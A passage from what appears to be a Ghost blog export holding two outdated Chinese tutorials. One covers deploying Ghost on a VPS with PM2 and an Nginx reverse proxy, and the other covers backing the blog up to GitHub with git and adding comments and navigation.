本身在墙外，所以三个版本用哪个都无所谓了，根据个人喜好即可。安装完毕后，可以用`npm start`启动开发模式或者用`npm start --production`启动生产模式，能看到正常启动即可。但这时是无法通过域名或 IP 进行访问的，因为在配置文件 *config.js* 中，只监听了本机。可以暂时停止 Ghost，继续往下配置。\\n\\n###让 Ghost 一直运行\\n作为网站，很明显它应该始终处于运行状态，也就是我们应该做些配置，让 Ghost 进程可以一直在后台保持运行。方法有很多种。官方文档中提供了 Forever、PM2、Supervisor、初始化脚本等方法，文档中推荐的是初始化脚本法。本文介绍的是 PM2 法。\\n首先 cd 到 Ghost 的安装目录\\n\\n    cd /var/www/ghost\\n然后，安装 PM2，并设置环境变量为***生产模式***，以 ***index.js*** 为入口启动，进程命名为 ***Ghost***\\n\\n    sudo npm install pm2 -g\\n    NODE_ENV=production pm2 start index.js --name \\\"Ghost\\\"\\n做完之后，PM2 将会守护 Ghost 博客的在线运行状态。可以通过`pm2 l`（是字母l）查看当前进程状态，可以通过`pm2 restart Ghost`重启博客程序（比如做了修改主题的工作后，可以用这个命令重启看效果）。\\n\\n最后，让 PM2 开机自动运行 Ghost 博客\\n\\n    pm2 startup Ubuntu\\n    pm2 save\\n\\n###配置 Nginx 反向代理\\n在线上环境，一般会在 Ghost 前端配置一个 Nginx 做反向代理。首先是安装和启动 Nginx：\\n\\n    sudo apt-get install nginx\\n    sudo service nginx start\\n然后，在`/etc/nginx/conf.d/`下创建一个配置文件`ghost.conf`.\\n\\n<pre><code>\\nvim /etc/nginx/conf.d/ghost.conf\\nserver {\\n    listen 0.0.0.0:80;\\n    server_name xxx.com;\\n    access_log /var/log/nginx/xxx.com.log;\\n\\n    location / {\\n        proxy_set_header X-Real-IP $remote_addr;\\n        proxy_set_header HOST $http_host;\\n        proxy_set_header X-NginX-Proxy true;\\n\\n        proxy_pass http://127.0.0.1:2368;\\n        proxy_redirect off;\\n    }\\n}\\n</code></pre>\\n其中，`server_name` 改成你自己的域名，之后将配置文件软链接到`site-enabled`下，并重启 Nginx\\n\\n    ln -s /etc/nginx/conf.d/ghost.conf /etc/nginx/sites-enabled/ghost.conf\\n    /etc/init.d/nginx restart\\n此时，Nginx 会监听所有 80 端口的请求，并将其 pass 给 2368 端口的 Ghost 服务程序，此时，打开浏览器，输入自己的域名，应该可以看到博客的欢迎界面了。\\n\\n---\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><strong>由于 Ghost 已更新到V1.x, 线上配置和运行部分已过时</strong></p>\n<p>前文介绍了如何在本机上搭建一个 Ghost 博客来进行体验，本文介绍如何在线上环境，即 VPS 上配置 Ghost，使其真正成为别人可以访问和浏览的个人网站。</p>\n<p>本文的内容分为：</p>\n<ol>\n<li>域名注册</li>\n<li>DNS 解析设置</li>\n<li>VPS 购买</li>\n<li>线上配置和运行 Ghost</li>\n</ol>\n<h2 id=\"\">域名注册</h2>\n<p>想要拥有一个个人网站，或者说个人博客，注册一个域名是十分重要的。当然，你可以不用域名，让大家直接用 IP 地址来访问，但这样很明显用户体验不够友好，所以首先介绍一下如何注册一个有个性的域名。</p>\n<p>域名的来源多种多样，有免费的，有花钱的，据说 GitHub 可以提供一年免费的 me 域名，我没有尝试过。也有不少人将个人网站以 GitHub Page 的形式建在 GitHub 上，这种解决方案不是本文的讨论范围。</p>\n<p>域名一般来讲都是花钱的，除去主流的常见顶级域名（比如本站用的 .com），现在还有 .info、.io、.tips、.xyz、.today 等等各种不常见的域名。一般注册域名需要找域名注册商，国内和国外均有。国外比较有名的老牌注册商有 <a href=\"https://www.godaddy.com\">GoDaddy</a>，<a href=\"https://www.namecheap.com/\">Namecheap</a> 等等。</p>\n<p>本站域名是在 GoDaddy 进行注册的，注册 GoDaddy 域名需要在它的官方网站注册一个账户，另外需要一张可以国际支付的信用卡，没有信用卡的话，可以选择淘宝 GoDaddy 代购服务。</p>\n<p>首先是在 GoDaddy 官方网站对自己想注册的域名进行搜索，看看是否已经被人注册过，如果没有的话，那么恭喜你，你可以顺利地成为这个域名的主人了。之后就是按照流程进行支付，如果选择代购的话，代购者会在支付过后将域名过户（Push）给你。</p>\n<p>域名注册完毕后，在个人账户下可以看到自己拥有的域名并对其进行管理。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/godaddy1.JPG\" alt=\"\"><br>\n<br /><br>\n点击 manage 后，比较重要的就是对 Nameservers 的设置，GoDaddy 有提供 DNS 解析的服务，但 GoDaddy 的 Nameservers 在国内不是很稳定，所以一般会将其改成国内的 DNSPod 提供的名字解析服务器，本站的设置为<br>\n<br /><br>\n<img src=\"/content/images/2015/07/godaddy2.JPG\" alt=\"\"><br>\n<br /></p>\n<p>至于这两个 Nameservers 的地址是如何来的，下节会说明。</p>\n<h2 id=\"dns\">DNS 解析设置</h2>\n<p>在国内的话，一般是推荐使用 <a href=\"https://www.dnspod.cn/\">DNSPod</a> 的解析服务，这个服务是免费的。在官方网站注册一个账号（或用 QQ 号登陆）后，即可以添加想解析的域名。</p>\n<p>添加域名后，DNSPod 会自动生成两个默认的 NS 记录，指定了域名解析服务器。然后将上文域名注册商那里的 NS 记录，改成 DNSPod 提供两个服务器即可。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/dnspod1.JPG\" alt=\"\"><br>\n<br /></p>\n<p>之后，就是在 DNSPod 上添加 A 记录，将域名解析到自己购买的 VPS 的 IP 地址上。域名注册商那边的 NS 更改，以及 DNSPod 这边的解析记录添加和更改，都需要等待一定的时间才能生效，本人的等待时间在半个小时左右。</p>\n<h2 id=\"vps\">VPS 购买</h2>\n<p>VPS 是指（Virtual Private Server），购买的是服务器上开出的一个虚拟机，租用独立的服务器价格较高，对于个人网站这种应用，购买一个 VPS 就已经足够了。<br>\n比较有名的 VPS 提供商有 <a href=\"http://aws.amazon.com/ec2\">Amazon EC2</a>， <a href=\"https://www.linode.com/\">Linode</a> 和 <a href=\"https://www.digitalocean.com/\">DigitalOcean</a> 等等，目前，DigitalOcean 首月使用是免费的，但需要一张可以国际支付的信用卡。因为本人目前没有信用卡，所以目前使用淘宝购买的日本 VPS，根据目前的体验，速度和稳定性都很好，只是不像 Linode 和 DigitalOcean 那样可以自己管理。</p>\n<p>国内也有 BAT 等公司提供云主机服务，但国内上线网站需要进行备案，十分麻烦，除非有特别需要，否则不推荐使用国内的主机。</p>\n<p>总之，购买 VPS 可以通过信用卡自己注册和购买，也可以淘宝代购。</p>\n<h2 id=\"ghost\">线上配置和运行 Ghost</h2>\n<p>购买 VPS 后，会得到一个可用的服务器和 IP 地址，将域名和 IP 地址做好解析之后，一切准备工作就完成了。接下来我们可以在 VPS 上上线自己的网站了。</p>\n<p>如果使用 Windows 系统的话，可以使用 SecureCRT 远程登陆 VPS，Linux 系统的话，直接使用 ssh 命令即可，如果登陆不了，要确认一下 VPS 开放的是否是 22 端口，以及是否开启了 ssh 服务。</p>\n<p>基本的安装流程同上一篇的本地搭建是一样的。首先是给 VPS 安装基本的编译环境，以及 Vim 等工具，然后安装 Node.js 和 npm，最后安装 Ghost，需要注意的是，由于 VPS 本身在墙外，所以三个版本用哪个都无所谓了，根据个人喜好即可。安装完毕后，可以用<code>npm start</code>启动开发模式或者用<code>npm start --production</code>启动生产模式，能看到正常启动即可。但这时是无法通过域名或 IP 进行访问的，因为在配置文件 <em>config.js</em> 中，只监听了本机。可以暂时停止 Ghost，继续往下配置。</p>\n<h3 id=\"ghost\">让 Ghost 一直运行</h3>\n<p>作为网站，很明显它应该始终处于运行状态，也就是我们应该做些配置，让 Ghost 进程可以一直在后台保持运行。方法有很多种。官方文档中提供了 Forever、PM2、Supervisor、初始化脚本等方法，文档中推荐的是初始化脚本法。本文介绍的是 PM2 法。<br>\n首先 cd 到 Ghost 的安装目录</p>\n<pre><code>cd /var/www/ghost\n</code></pre>\n<p>然后，安装 PM2，并设置环境变量为***生产模式***，以 <strong><em>index.js</em></strong> 为入口启动，进程命名为 <strong><em>Ghost</em></strong></p>\n<pre><code>sudo npm install pm2 -g\nNODE_ENV=production pm2 start index.js --name &quot;Ghost&quot;\n</code></pre>\n<p>做完之后，PM2 将会守护 Ghost 博客的在线运行状态。可以通过<code>pm2 l</code>（是字母l）查看当前进程状态，可以通过<code>pm2 restart Ghost</code>重启博客程序（比如做了修改主题的工作后，可以用这个命令重启看效果）。</p>\n<p>最后，让 PM2 开机自动运行 Ghost 博客</p>\n<pre><code>pm2 startup Ubuntu\npm2 save\n</code></pre>\n<h3 id=\"nginx\">配置 Nginx 反向代理</h3>\n<p>在线上环境，一般会在 Ghost 前端配置一个 Nginx 做反向代理。首先是安装和启动 Nginx：</p>\n<pre><code>sudo apt-get install nginx\nsudo service nginx start\n</code></pre>\n<p>然后，在<code>/etc/nginx/conf.d/</code>下创建一个配置文件<code>ghost.conf</code>.</p>\n<pre><code>\nvim /etc/nginx/conf.d/ghost.conf\nserver {\n    listen 0.0.0.0:80;\n    server_name xxx.com;\n    access_log /var/log/nginx/xxx.com.log;\n\n    location / {\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header HOST $http_host;\n        proxy_set_header X-NginX-Proxy true;\n\n        proxy_pass http://127.0.0.1:2368;\n        proxy_redirect off;\n    }\n}\n</code></pre>\n<p>其中，<code>server_name</code> 改成你自己的域名，之后将配置文件软链接到<code>site-enabled</code>下，并重启 Nginx</p>\n<pre><code>ln -s /etc/nginx/conf.d/ghost.conf /etc/nginx/sites-enabled/ghost.conf\n/etc/init.d/nginx restart\n</code></pre>\n<p>此时，Nginx 会监听所有 80 端口的请求，并将其 pass 给 2368 端口的 Ghost 服务程序，此时，打开浏览器，输入自己的域名，应该可以看到博客的欢迎界面了。</p>\n<hr>\n</div>","amp":"8","plaintext":"由于 Ghost 已更新到V1.x, 线上配置和运行部分已过时\n\n前文介绍了如何在本机上搭建一个 Ghost 博客来进行体验，本文介绍如何在线上环境，即 VPS 上配置 Ghost，使其真正成为别人可以访问和浏览的个人网站。\n\n本文的内容分为：\n\n 1. 域名注册\n 2. DNS 解析设置\n 3. VPS 购买\n 4. 线上配置和运行 Ghost\n\n域名注册\n想要拥有一个个人网站，或者说个人博客，注册一个域名是十分重要的。当然，你可以不用域名，让大家直接用 IP\n地址来访问，但这样很明显用户体验不够友好，所以首先介绍一下如何注册一个有个性的域名。\n\n域名的来源多种多样，有免费的，有花钱的，据说 GitHub 可以提供一年免费的 me 域名，我没有尝试过。也有不少人将个人网站以 GitHub Page\n的形式建在 GitHub 上，这种解决方案不是本文的讨论范围。\n\n域名一般来讲都是花钱的，除去主流的常见顶级域名（比如本站用的 .com），现在还有 .info、.io、.tips、.xyz、.today\n等等各种不常见的域名。一般注册域名需要找域名注册商，国内和国外均有。国外比较有名的老牌注册商有 GoDaddy\n[https://www.godaddy.com]，Namecheap [https://www.namecheap.com/]  等等。\n\n本站域名是在 GoDaddy 进行注册的，注册 GoDaddy\n域名需要在它的官方网站注册一个账户，另外需要一张可以国际支付的信用卡，没有信用卡的话，可以选择淘宝 GoDaddy 代购服务。\n\n首先是在 GoDaddy\n官方网站对自己想注册的域名进行搜索，看看是否已经被人注册过，如果没有的话，那么恭喜你，你可以顺利地成为这个域名的主人了。之后就是按照流程进行支付，如果选择代购的话，代购者会在支付过后将域名过户（Push）给你。\n\n域名注册完毕后，在个人账户下可以看到自己拥有的域名并对其进行管理。\n\n\n\n\n\n点击 manage 后，比较重要的就是对 Nameservers 的设置，GoDaddy 有提供 DNS 解析的服务，但 GoDaddy 的\nNameservers 在国内不是很稳定，所以一般会将其改成国内的 DNSPod 提供的名字解析服务器，本站的设置为\n\n\n\n\n\n\n至于这两个 Nameservers 的地址是如何来的，下节会说明。\n\nDNS 解析设置\n在国内的话，一般是推荐使用 DNSPod [https://www.dnspod.cn/]  的解析服务，这个服务是免费的。在官方网站注册一个账号（或用 QQ\n号登陆）后，即可以添加想解析的域名。\n\n添加域名后，DNSPod 会自动生成两个默认的 NS 记录，指定了域名解析服务器。然后将上文域名注册商那里的 NS 记录，改成 DNSPod\n提供两个服务器即可。\n\n\n\n\n\n\n之后，就是在 DNSPod 上添加 A 记录，将域名解析到自己购买的 VPS 的 IP 地址上。域名注册商那边的 NS 更改，以及 DNSPod\n这边的解析记录添加和更改，都需要等待一定的时间才能生效，本人的等待时间在半个小时左右。\n\nVPS 购买\nVPS 是指（Virtual Private Server），购买的是服务器上开出的一个虚拟机，租用独立的服务器价格较高，对于个人网站这种应用，购买一个 VPS\n就已经足够了。\n比较有名的 VPS 提供商有 Amazon EC2 [http://aws.amazon.com/ec2]， Linode\n[https://www.linode.com/]  和 DigitalOcean [https://www.digitalocean.com/] \n等等，目前，DigitalOcean 首月使用是免费的，但需要一张可以国际支付的信用卡。因为本人目前没有信用卡，所以目前使用淘宝购买的日本\nVPS，根据目前的体验，速度和稳定性都很好，只是不像 Linode 和 DigitalOcean 那样可以自己管理。\n\n国内也有 BAT 等公司提供云主机服务，但国内上线网站需要进行备案，十分麻烦，除非有特别需要，否则不推荐使用国内的主机。\n\n总之，购买 VPS 可以通过信用卡自己注册和购买，也可以淘宝代购。\n\n线上配置和运行 Ghost\n购买 VPS 后，会得到一个可用的服务器和 IP 地址，将域名和 IP 地址做好解析之后，一切准备工作就完成了。接下来我们可以在 VPS 上上线自己的网站了。\n\n如果使用 Windows 系统的话，可以使用 SecureCRT 远程登陆 VPS，Linux 系统的话，直接使用 ssh 命令即可，如果登陆不了，要确认一下\nVPS 开放的是否是 22 端口，以及是否开启了 ssh 服务。\n\n基本的安装流程同上一篇的本地搭建是一样的。首先是给 VPS 安装基本的编译环境，以及 Vim 等工具，然后安装 Node.js 和 npm，最后安装\nGhost，需要注意的是，由于 VPS 本身在墙外，所以三个版本用哪个都无所谓了，根据个人喜好即可。安装完毕后，可以用npm start启动开发模式或者用npm\nstart --production启动生产模式，能看到正常启动即可。但这时是无法通过域名或 IP 进行访问的，因为在配置文件 config.js \n中，只监听了本机。可以暂时停止 Ghost，继续往下配置。\n\n让 Ghost 一直运行\n作为网站，很明显它应该始终处于运行状态，也就是我们应该做些配置，让 Ghost 进程可以一直在后台保持运行。方法有很多种。官方文档中提供了\nForever、PM2、Supervisor、初始化脚本等方法，文档中推荐的是初始化脚本法。本文介绍的是 PM2 法。\n首先 cd 到 Ghost 的安装目录\n\ncd /var/www/ghost\n\n\n然后，安装 PM2，并设置环境变量为***生产模式***，以 index.js  为入口启动，进程命名为 Ghost\n\nsudo npm install pm2 -g\nNODE_ENV=production pm2 start index.js --name \"Ghost\"\n\n\n做完之后，PM2 将会守护 Ghost 博客的在线运行状态。可以通过pm2 l（是字母l）查看当前进程状态，可以通过pm2 restart Ghost\n重启博客程序（比如做了修改主题的工作后，可以用这个命令重启看效果）。\n\n最后，让 PM2 开机自动运行 Ghost 博客\n\npm2 startup Ubuntu\npm2 save\n\n\n配置 Nginx 反向代理\n在线上环境，一般会在 Ghost 前端配置一个 Nginx 做反向代理。首先是安装和启动 Nginx：\n\nsudo apt-get install nginx\nsudo service nginx start\n\n\n然后，在/etc/nginx/conf.d/下创建一个配置文件ghost.conf.\n\n\nvim /etc/nginx/conf.d/ghost.conf\nserver {\n    listen 0.0.0.0:80;\n    server_name xxx.com;\n    access_log /var/log/nginx/xxx.com.log;\n\n    location / {\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header HOST $http_host;\n        proxy_set_header X-NginX-Proxy true;\n\n        proxy_pass http://127.0.0.1:2368;\n        proxy_redirect off;\n    }\n}\n\n\n其中，server_name  改成你自己的域名，之后将配置文件软链接到site-enabled下，并重启 Nginx\n\nln -s /etc/nginx/conf.d/ghost.conf /etc/nginx/sites-enabled/ghost.conf\n/etc/init.d/nginx restart\n\n\n此时，Nginx 会监听所有 80 端口的请求，并将其 pass 给 2368 端口的 Ghost\n服务程序，此时，打开浏览器，输入自己的域名，应该可以看到博客的欢迎界面了。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-06T10:54:41.000Z","created_by":"1","updated_at":"2017-09-16T13:33:55.000Z","updated_by":"1","published_at":"2015-07-06T10:54:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c3e","uuid":"07285e07-cd87-4053-a959-f0a9eca231b5","title":"基于 Ghost 搭建个人博客-设置和管理（已过时）","slug":"bo-ke-guan-li","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"**由于 Ghost 已更新到V1.x, git 操作可参考，备份方法已过时**\\n\\n上篇文章介绍了如何在 VPS 上搭建个人网站，当可以在浏览器中通过输入域名访问到自己的 Ghost 博客时，基本的搭建工作就完成了，下一步就是对博客本身的配置和管理。\\n\\n本文主要包括以下内容：\\n\\n1. 使用 git 对博客进行版本管理\\n2. 为博客添加评论系统\\n3. 为博客添加分享功能\\n4. 为博客添加上一篇和下一篇导航链接\\n\\n##使用 git 对博客进行版本控制\\n由于自己的博客是在不断地修改和更新的，为了防止 VPS 意外挂掉等等问题，最好能够非常及时地保存一份博客代码的副本，同时为了防止自己修改配置的时候把博客玩儿坏，也需要能够对上一个版本进行及时地恢复。很显然，GitHub 或者 SVN 都能提供这样的功能。这里介绍如何使用 GitHub 托管博客代码。\\n\\n第一步：注册 [GitHub](https://github.com/) 账号\\n\\n第二步：在 VPS 上安装 git，并和 GitHub 账号进行绑定\\n\\n安装 git\\n\\n    sudo apt-get install git\\n名称和邮箱绑定\\n\\n    git config --global user.name \\\"your name\\\"  \\n    git config --global user.email \\\"your email\\\"\\n`your name`填你 GitHub 的用户名，`your email`填你注册 GitHub 的邮箱。\\n\\n设置 SSH 密钥\\n\\n    ssh-keygen -t rsa -C \\\"your_email@example.com\\\"\\n这里的邮箱填刚才的邮箱就可以，生成过程中会有一步让你输入`ssh passphrase`，你可以选择输入一个密码，也可以选择直接回车跳过，区别就是最终生成的私钥是否加密，直接回车跳过的话，私钥是不加密的。执行完毕后，在`/root/.ssh`目录下，会生成 id\\\\_rsa.pub 和 id\\\\_rsa 两个文件，分别是公钥和私钥。打开 id\\\\_rsa.pub，将其中的内容复制下来。\\n\\n在浏览器上登陆 GitHub 账户，在 settings 菜单中选择 SSH Keys，选择 Add SSH Key，标题起一个自己能辨认的，将刚才复制的公钥内容粘贴进去，从图片可以看到，我已经为自己的电脑创建了一个 Key，现在正在为自己的 VPS 添加另一个。\\n<br />\\n![](/content/images/2015/07/1.JPG)\\n<br />\\n密钥添加完毕后，在 VPS 上测试是否可以连接成功。\\n\\n    ssh -T git@github.com  \\n第一次连接你需要输入一个 yes，之后看到下面的欢迎信息，则表示成功。\\n<br />\\n![](/content/images/2015/07/2.JPG)\\n<br />\\n![](/content/images/2015/07/3.JPG)\\n<br />\\n\\n可以和 GitHub 进行连接后，在自己的 GitHub 上点击`+ New repository`创建一个新的仓库。\\n<br />\\n![](/content/images/2015/07/repo.JPG)\\n<br />\\n在创建界面，为自己的仓库起一个名字，描述可以随便写写，由于我们已经把博客建好了，所以并不需要初始化，一会直接把本地代码 push 上去就可以。点击 `Create repository` 后，可以先不管它了。\\n\\n这时回到 VPS 上，前文已述，Ghost 目录位于 `/var/www/`下，名字是`ghost`，下面执行以下操作使用 git 管理博客代码。\\n\\n第一步是初始化\\n\\n    cd /var/www/ghost\\n    git init\\n第二步是将本地仓库和 GitHub 上的远程仓库进行绑定\\n\\n    git remote add origin git@github.com:yourname/MyBlog.git  \\n其中`yourname`改成你的用户名，也就是上个图片中 Owner 的名字，`MyBlog.git`中的`MyBlog`改成你的仓库名字，如果你也叫 MyBlog，那当然就不用改了。\\n\\n绑定完毕后，将所有源文件添加跟踪并提交到本地库。\\n\\n    git add .\\n    git commit -m \\\"message\\\"\\n`message`是一个描述信息，随意写，比如 fist commit 之类的，你修改了什么之类的，是给自己看的。注意这里的 commit 是提交到 VPS 上的本地库了，而并非 GitHub 上，最后\\n\\n    git push origin master\\n将本次修改，提交到 GitHub 上，这样就结束了。在以后的使用中，如果修改了博客代码或者写了新文章，可以用`git status`查看状态，它会显示哪些文件未跟踪，哪些文件修改了。可以用`git add .`或者`git add filename`将新文件加入管理，然后使用`git commit -m \\\"message\\\"`和`git push origin master`将修改提交到 GitHub。当然这种只在 master 分支上开发的方法不是特别正规，但个人博客这种项目感觉也就无所谓了。\\n\\n## 为博客添加 DISQUS 评论系统\\n添加评论系统的话，不同的主题会不一样，对于本站使用的主题来说，只需要把在 [disqus](https://disqus.com/) 官网注册的 short_name 填写在 comment.hbs 里面就可以了，之后把 post.hbs 里面的 comment 注释取消即可生效。\\n\\n如果你用了自定义主题，那么请参考相关主题的说明。对于默认的主题，可以参考官方给出的[说明文档](http://support.ghost.org/add-disqus-to-my-ghost-blog/)。\\n\\n## 为博客添加分享功能\\n如果想添加分享功能的话，这个也和主题有关，本站使用的主题没有分享的代码，所以需要自己添加，有的主题是自带的，所以就可以跳过了。\\n\\n方法是使用[百度分享](http://share.baidu.com/code)，根据自己的喜好获得代码之后，写用 Markdown 写博客的时候，直接粘贴在编辑器里面就可以。\\n\\n另外也可以将代码粘贴到主题目录下的 post.hbs 里面，放在 `</article>`和`{{/post}}`之间。\\n##为博客添加上一篇和下一篇导航\\n有的主题里面，post.hbs 文件里面把代码都写好了，本身自带，如果没有的话，可以把下面这段代码放到上面那个分享代码的后面，或者前面，这个顺序完全看个人喜好。\\n<pre><code>\\n&lt;nav&gt;\\n    &lt;div&gt;\\n        {{#if next}}\\n        前一篇：&lt;a href=\\\"{{next.url}}\\\"&gt;{{{next.title}}}&lt;/a&gt;\\n        {{/if}}\\n    &lt;/div&gt;\\n    &lt;div&gt;\\n        {{#if previous}}\\n        后一篇：&lt;a href=\\\"{{previous.url}}\\\"&gt;{{{previous.title}}}&lt;/a&gt;\\n        {{/if}}\\n    &lt;/div&gt;\\n&lt;/nav&gt;\\n</code></pre>\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><strong>由于 Ghost 已更新到V1.x, git 操作可参考，备份方法已过时</strong></p>\n<p>上篇文章介绍了如何在 VPS 上搭建个人网站，当可以在浏览器中通过输入域名访问到自己的 Ghost 博客时，基本的搭建工作就完成了，下一步就是对博客本身的配置和管理。</p>\n<p>本文主要包括以下内容：</p>\n<ol>\n<li>使用 git 对博客进行版本管理</li>\n<li>为博客添加评论系统</li>\n<li>为博客添加分享功能</li>\n<li>为博客添加上一篇和下一篇导航链接</li>\n</ol>\n<h2 id=\"git\">使用 git 对博客进行版本控制</h2>\n<p>由于自己的博客是在不断地修改和更新的，为了防止 VPS 意外挂掉等等问题，最好能够非常及时地保存一份博客代码的副本，同时为了防止自己修改配置的时候把博客玩儿坏，也需要能够对上一个版本进行及时地恢复。很显然，GitHub 或者 SVN 都能提供这样的功能。这里介绍如何使用 GitHub 托管博客代码。</p>\n<p>第一步：注册 <a href=\"https://github.com/\">GitHub</a> 账号</p>\n<p>第二步：在 VPS 上安装 git，并和 GitHub 账号进行绑定</p>\n<p>安装 git</p>\n<pre><code>sudo apt-get install git\n</code></pre>\n<p>名称和邮箱绑定</p>\n<pre><code>git config --global user.name &quot;your name&quot;  \ngit config --global user.email &quot;your email&quot;\n</code></pre>\n<p><code>your name</code>填你 GitHub 的用户名，<code>your email</code>填你注册 GitHub 的邮箱。</p>\n<p>设置 SSH 密钥</p>\n<pre><code>ssh-keygen -t rsa -C &quot;your_email@example.com&quot;\n</code></pre>\n<p>这里的邮箱填刚才的邮箱就可以，生成过程中会有一步让你输入<code>ssh passphrase</code>，你可以选择输入一个密码，也可以选择直接回车跳过，区别就是最终生成的私钥是否加密，直接回车跳过的话，私钥是不加密的。执行完毕后，在<code>/root/.ssh</code>目录下，会生成 id_rsa.pub 和 id_rsa 两个文件，分别是公钥和私钥。打开 id_rsa.pub，将其中的内容复制下来。</p>\n<p>在浏览器上登陆 GitHub 账户，在 settings 菜单中选择 SSH Keys，选择 Add SSH Key，标题起一个自己能辨认的，将刚才复制的公钥内容粘贴进去，从图片可以看到，我已经为自己的电脑创建了一个 Key，现在正在为自己的 VPS 添加另一个。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/1.JPG\" alt=\"\"><br>\n<br /><br>\n密钥添加完毕后，在 VPS 上测试是否可以连接成功。</p>\n<pre><code>ssh -T git@github.com  \n</code></pre>\n<p>第一次连接你需要输入一个 yes，之后看到下面的欢迎信息，则表示成功。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/2.JPG\" alt=\"\"><br>\n<br /><br>\n<img src=\"/content/images/2015/07/3.JPG\" alt=\"\"><br>\n<br /></p>\n<p>可以和 GitHub 进行连接后，在自己的 GitHub 上点击<code>+ New repository</code>创建一个新的仓库。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/repo.JPG\" alt=\"\"><br>\n<br /><br>\n在创建界面，为自己的仓库起一个名字，描述可以随便写写，由于我们已经把博客建好了，所以并不需要初始化，一会直接把本地代码 push 上去就可以。点击 <code>Create repository</code> 后，可以先不管它了。</p>\n<p>这时回到 VPS 上，前文已述，Ghost 目录位于 <code>/var/www/</code>下，名字是<code>ghost</code>，下面执行以下操作使用 git 管理博客代码。</p>\n<p>第一步是初始化</p>\n<pre><code>cd /var/www/ghost\ngit init\n</code></pre>\n<p>第二步是将本地仓库和 GitHub 上的远程仓库进行绑定</p>\n<pre><code>git remote add origin git@github.com:yourname/MyBlog.git  \n</code></pre>\n<p>其中<code>yourname</code>改成你的用户名，也就是上个图片中 Owner 的名字，<code>MyBlog.git</code>中的<code>MyBlog</code>改成你的仓库名字，如果你也叫 MyBlog，那当然就不用改了。</p>\n<p>绑定完毕后，将所有源文件添加跟踪并提交到本地库。</p>\n<pre><code>git add .\ngit commit -m &quot;message&quot;\n</code></pre>\n<p><code>message</code>是一个描述信息，随意写，比如 fist commit 之类的，你修改了什么之类的，是给自己看的。注意这里的 commit 是提交到 VPS 上的本地库了，而并非 GitHub 上，最后</p>\n<pre><code>git push origin master\n</code></pre>\n<p>将本次修改，提交到 GitHub 上，这样就结束了。在以后的使用中，如果修改了博客代码或者写了新文章，可以用<code>git status</code>查看状态，它会显示哪些文件未跟踪，哪些文件修改了。可以用<code>git add .</code>或者<code>git add filename</code>将新文件加入管理，然后使用<code>git commit -m &quot;message&quot;</code>和<code>git push origin master</code>将修改提交到 GitHub。当然这种只在 master 分支上开发的方法不是特别正规，但个人博客这种项目感觉也就无所谓了。</p>\n<h2 id=\"disqus\">为博客添加 DISQUS 评论系统</h2>\n<p>添加评论系统的话，不同的主题会不一样，对于本站使用的主题来说，只需要把在 <a href=\"https://disqus.com/\">disqus</a> 官网注册的 short_name 填写在 comment.hbs 里面就可以了，之后把 post.hbs 里面的 comment 注释取消即可生效。</p>\n<p>如果你用了自定义主题，那么请参考相关主题的说明。对于默认的主题，可以参考官方给出的<a href=\"http://support.ghost.org/add-disqus-to-my-ghost-blog/\">说明文档</a>。</p>\n<h2 id=\"\">为博客添加分享功能</h2>\n<p>如果想添加分享功能的话，这个也和主题有关，本站使用的主题没有分享的代码，所以需要自己添加，有的主题是自带的，所以就可以跳过了。</p>\n<p>方法是使用<a href=\"http://share.baidu.com/code\">百度分享</a>，根据自己的喜好获得代码之后，写用 Markdown 写博客的时候，直接粘贴在编辑器里面就可以。</p>\n<p>另外也可以将代码粘贴到主题目录下的 post.hbs 里面，放在 <code>&lt;/article&gt;</code>和<code>{{/post}}</code>之间。</p>\n<h2 id=\"\">为博客添加上一篇和下一篇导航</h2>\n<p>有的主题里面，post.hbs 文件里面把代码都写好了，本身自带，如果没有的话，可以把下面这段代码放到上面那个分享代码的后面，或者前面，这个顺序完全看个人喜好。</p>\n<pre><code>\n&lt;nav&gt;\n    &lt;div&gt;\n        {{#if next}}\n        前一篇：&lt;a href=\"{{next.url}}\"&gt;{{{next.title}}}&lt;/a&gt;\n        {{/if}}\n    &lt;/div&gt;\n    &lt;div&gt;\n        {{#if previous}}\n        后一篇：&lt;a href=\"{{previous.url}}\"&gt;{{{previous.title}}}&lt;/a&gt;\n        {{/if}}\n    &lt;/div&gt;\n&lt;/nav&gt;\n</code></pre></div>","amp":"9","plaintext":"由于 Ghost 已更新到V1.x, git 操作可参考，备份方法已过时\n\n上篇文章介绍了如何在 VPS 上搭建个人网站，当可以在浏览器中通过输入域名访问到自己的 Ghost\n博客时，基本的搭建工作就完成了，下一步就是对博客本身的配置和管理。\n\n本文主要包括以下内容：\n\n 1. 使用 git 对博客进行版本管理\n 2. 为博客添加评论系统\n 3. 为博客添加分享功能\n 4. 为博客添加上一篇和下一篇导航链接\n\n使用 git 对博客进行版本控制\n由于自己的博客是在不断地修改和更新的，为了防止 VPS\n意外挂掉等等问题，最好能够非常及时地保存一份博客代码的副本，同时为了防止自己修改配置的时候把博客玩儿坏，也需要能够对上一个版本进行及时地恢复。很显然，GitHub\n或者 SVN 都能提供这样的功能。这里介绍如何使用 GitHub 托管博客代码。\n\n第一步：注册 GitHub [https://github.com/]  账号\n\n第二步：在 VPS 上安装 git，并和 GitHub 账号进行绑定\n\n安装 git\n\nsudo apt-get install git\n\n\n名称和邮箱绑定\n\ngit config --global user.name \"your name\"  \ngit config --global user.email \"your email\"\n\n\nyour name填你 GitHub 的用户名，your email填你注册 GitHub 的邮箱。\n\n设置 SSH 密钥\n\nssh-keygen -t rsa -C \"your_email@example.com\"\n\n\n这里的邮箱填刚才的邮箱就可以，生成过程中会有一步让你输入ssh 